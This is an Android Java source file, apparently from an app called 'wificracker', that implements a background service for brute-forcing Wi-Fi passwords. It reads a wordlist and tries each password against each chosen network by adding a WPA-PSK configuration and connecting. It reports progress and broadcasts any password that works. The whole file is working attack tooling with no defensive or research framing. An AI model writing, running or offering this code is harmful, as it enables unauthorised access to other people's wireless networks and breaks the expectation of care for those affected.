package com.wificracker.app.service;

import android.app.Service;
import android.content.Intent;
import android.net.wifi.WifiConfiguration;
import android.net.wifi.WifiManager;
import android.os.IBinder;
import android.util.Log;
import androidx.annotation.Nullable;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.util.ArrayList;
import java.util.List;
import com.wificracker.app.WiFiNetwork;

public class PasswordCrackerService extends Service {
    private static final String TAG = "PasswordCrackerService";
    private WifiManager wifiManager;
    private List<WiFiNetwork> networks;
    private String passwordFile;
    private boolean isRunning = false;
    private int totalPasswords = 0;
    private int currentPasswordIndex = 0;

    @Override
    public void onCreate() {
        super.onCreate();
        wifiManager = (WifiManager) getApplicationContext().getSystemService(WIFI_SERVICE);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent != null) {
            passwordFile = intent.getStringExtra("passwordFile");
            networks = intent.getParcelableArrayListExtra("networks");
            if (passwordFile != null && networks != null && !networks.isEmpty()) {
                startCracking();
            } else {
                Log.e(TAG, "Missing password file or networks");
                stopSelf();
            }
        }
        return START_NOT_STICKY;
    }

    private void startCracking() {
        if (isRunning) return;
        isRunning = true;
        new Thread(() -> {
            try {
                // Count total passwords first
                BufferedReader countReader = new BufferedReader(new InputStreamReader(getContentResolver().openInputStream(android.net.Uri.parse(passwordFile))));
                while (countReader.readLine() != null) {
                    totalPasswords++;
                }
                countReader.close();

                // Start actual cracking
                BufferedReader reader = new BufferedReader(new InputStreamReader(getContentResolver().openInputStream(android.net.Uri.parse(passwordFile))));
                String password;
                currentPasswordIndex = 0;

                while ((password = reader.readLine()) != null && isRunning) {
                    currentPasswordIndex++;
                    for (WiFiNetwork network : networks) {
                        if (!isRunning) break;
                        
                        broadcastProgress(network, password);
                        if (tryConnect(network, password)) {
                            broadcastSuccess(network, password);
                            stopSelf();
                            return;
                        }
                    }
                }
                reader.close();
                broadcastFailure();
            } catch (Exception e) {
                Log.e(TAG, "Error reading password file", e);
                broadcastFailure();
            } finally {
                isRunning = false;
                stopSelf();
            }
        }).start();
    }

    private void broadcastProgress(WiFiNetwork network, String currentPassword) {
        Intent broadcastIntent = new Intent("com.wificracker.app.CRACK_PROGRESS");
        broadcastIntent.putExtra("ssid", network.getSSID());
        broadcastIntent.putExtra("currentPassword", currentPassword);
        broadcastIntent.putExtra("progress", (currentPasswordIndex * 100) / totalPasswords);
        sendBroadcast(broadcastIntent);
    }

    private boolean tryConnect(WiFiNetwork network, String password) {
        WifiConfiguration config = new WifiConfiguration();
        config.SSID = "\"" + network.getSSID() + "\"";
        config.preSharedKey = "\"" + password + "\"";
        config.status = WifiConfiguration.Status.ENABLED;
        config.allowedProtocols.set(WifiConfiguration.Protocol.RSN);
        config.allowedKeyManagement.set(WifiConfiguration.KeyMgmt.WPA_PSK);
        config.allowedPairwiseCiphers.set(WifiConfiguration.PairwiseCipher.CCMP);
        config.allowedPairwiseCiphers.set(WifiConfiguration.PairwiseCipher.TKIP);
        config.allowedGroupCiphers.set(WifiConfiguration.GroupCipher.WEP40);
        config.allowedGroupCiphers.set(WifiConfiguration.GroupCipher.WEP104);
        config.allowedGroupCiphers.set(WifiConfiguration.GroupCipher.CCMP);
        config.allowedGroupCiphers.set(WifiConfiguration.GroupCipher.TKIP);

        int netId = wifiManager.addNetwork(config);
        wifiManager.disconnect();
        wifiManager.enableNetwork(netId, true);
        wifiManager.reconnect();

        try {
            Thread.sleep(5000);
        } catch (InterruptedException e) {
            Thread.currentThread().interrupt();
        }

        return wifiManager.getConnectionInfo().getSSID().equals("\"" + network.getSSID() + "\"");
    }

    private void broadcastSuccess(WiFiNetwork network, String password) {
        Intent broadcastIntent = new Intent("com.wificracker.app.CRACK_SUCCESS");
        broadcastIntent.putExtra("ssid", network.getSSID());
        broadcastIntent.putExtra("password", password);
        sendBroadcast(broadcastIntent);
    }

    private void broadcastFailure() {
        Intent broadcastIntent = new Intent("com.wificracker.app.CRACK_FAILURE");
        sendBroadcast(broadcastIntent);
    }

    @Override
    public void onDestroy() {
        isRunning = false;
        super.onDestroy();
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
} 